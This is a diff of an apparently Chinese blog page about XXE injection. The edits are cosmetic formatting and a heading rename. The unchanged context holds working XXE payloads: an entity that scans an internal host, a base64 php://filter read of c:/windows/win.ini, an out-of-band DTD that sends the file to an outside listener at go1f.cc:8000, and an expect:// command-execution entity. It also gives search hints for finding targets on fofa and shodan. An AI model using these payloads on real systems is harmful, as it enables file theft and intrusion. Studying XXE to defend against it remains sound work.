@@ -202,7 +202,8 @@ if (!doNotTrack) {
 	&lt;!ENTITY scan SYSTEM &quot;http://192.168.5.5:8080&quot;&gt;
 ]&gt;
 &lt;test&gt;&amp;scan;&lt;/test&gt;
-</code></pre><h3 id="任意文件读取">任意文件读取</h3>
+</code></pre><p>​</p>
+<h3 id="任意文件读取">任意文件读取</h3>
 <p>加载外部DTD</p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding='utf-8'?&gt;     
 &lt;!DOCTYPE payload [
@@ -211,14 +212,15 @@ if (!doNotTrack) {
 ]&gt;
 &lt;payload&gt;&amp;txt;&lt;/payload&gt;
 </code></pre><p>​</p>
-<p><strong>payload.dtd构造</strong></p>
+<p>payload.dtd构造</p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY txt SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;
 
 &lt;!ENTITY % payload SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;
 &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://go1f.cc:8000/%payload;'&gt;&quot;&gt;
 %int;
 %trick;
-</code></pre><p>攻击服务器开启8000端口监听
+</code></pre><p>​</p>
+<p>攻击服务器开启8000端口监听
 <img src="https://i.loli.net/2020/02/16/KB3kYwZ5cnEzWgM.jpg" alt="nc_XXE.jpg"></p>
 <p>​</p>
 <p><img src="https://i.loli.net/2020/02/16/FMi317mWJQ8ZjOf.jpg" alt="XXE response.jpg"></p>
@@ -227,7 +229,7 @@ if (!doNotTrack) {
 <p>需要 expect 扩展</p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY xee SYSTEM &quot;expect://command&quot;&gt;
 </code></pre><p>​</p>
-<h2 id="参考文章">参考文章</h2>
+<h2 id="扩展阅读">扩展阅读</h2>
 <p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p>
 <p>XXE攻击实例查找(fofa.so\ shodan.io)</p>
 <pre><code>header=text/xml
@@ -262,7 +264,7 @@ if (!doNotTrack) {
         <li><a href="#命令执行">命令执行</a></li>
       </ul>
     </li>
-    <li><a href="#参考文章">参考文章</a></li>
+    <li><a href="#扩展阅读">扩展阅读</a></li>
   </ul>
 </nav></div>
   
